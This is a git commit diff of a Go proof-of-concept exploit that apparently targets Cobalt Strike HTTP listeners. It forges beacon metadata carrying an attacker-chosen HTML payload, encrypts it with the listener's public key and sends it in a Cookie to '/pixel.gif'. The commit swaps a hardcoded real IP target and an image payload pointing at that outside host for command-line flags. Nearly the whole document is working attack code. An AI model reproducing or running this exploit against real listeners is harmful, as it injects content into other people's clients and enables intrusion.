4e9fd2322f3ab0b49c4cf4cdd2931c001b3f7c8a
一曲成殇 <32994290+yqcs@users.noreply.github.com>
2022-09-24 17:40:23 +0800

    update

--- main.go
+++ main.go
@@ -3,27 +3,44 @@ package main
 import (
 	"CSPOC/utils"
 	"encoding/base64"
+	"flag"
 	"fmt"
+	"log"
 	"net/http"
 )
 
 func main() {
-	poc := "\x00\x00\xbe\xef\x00\x00\x00e\x0b\x00\x04\r\x0e\x0f\x0e\x0f\x0c\x0e\x02\x0f\x08\x07\x03\x05\xa8\x03\xa8\x03\x00" +
-		"<\xe5\xee\x00\x00\xb4c\x00\x00\x04\x06\x02#\xf0\x00\x00\x00\x00v\x91\n`v\x90\xf5P\x0c\r\n\x02ZTian\t<html><img src=http://124.70.40.185/logo.png>\ta" //替换资源路径 不宜过长
 
-	url := "http://124.70.40.185:8500" //目标HTTP监听，如 http://127.0.0.1:8100
+	listen := flag.String("l", "", "CobaltStrike Http listen url")                         //HTTP监听地址，如 http://127.0.0.1:8100
+	payload := flag.String("p", "", "payload,em: <img src=http://124.70.40.185/logo.png>") //payload，如 <html><img src=http://127.0.0.1/log.png> 不宜过长
+	flag.Parse()
+	if *listen == "" || *payload == "" {
+		log.Fatalln("Listen or payload is null")
+	}
+
+	//公钥
 	publicKey := `
 -----BEGIN PUBLIC KEY-----
-` + utils.GetPublicKey(url) + `
+` + utils.GetPublicKey(*listen) + `
 -----END PUBLIC KEY-----`
+
+	//poc
+	poc := "\x00\x00\xbe\xef\x00\x00\x00e\x0b\x00\x04\r\x0e\x0f\x0e\x0f\x0c\x0e\x02\x0f\x08\x07\x03\x05\xa8\x03\xa8\x03\x00" +
+		"<\xe5\xee\x00\x00\xb4c\x00\x00\x04\x06\x02#\xf0\x00\x00\x00\x00v\x91\n`v\x90\xf5P\x0c\r\n\x02ZTian\t" + *payload + "\ta"
+
+	//rsa加密
 	rsaData := utils.RsaEncoding(poc, publicKey)
 	if rsaData == nil {
-		panic("rsa public key error")
+		log.Fatalln("rsa public key error")
 	}
-	request, err := http.NewRequest("GET", url+"/pixel.gif", nil)
+
+	//发送请求
+	request, err := http.NewRequest("GET", *listen+"/pixel.gif", nil)
 	if err != nil {
 		return
 	}
+
+	//payload经过base64加密之后添加至cookie
 	request.Header.Add("Cookie", base64.StdEncoding.EncodeToString(rsaData))
 	do, err := http.DefaultClient.Do(request)
 	if err != nil {
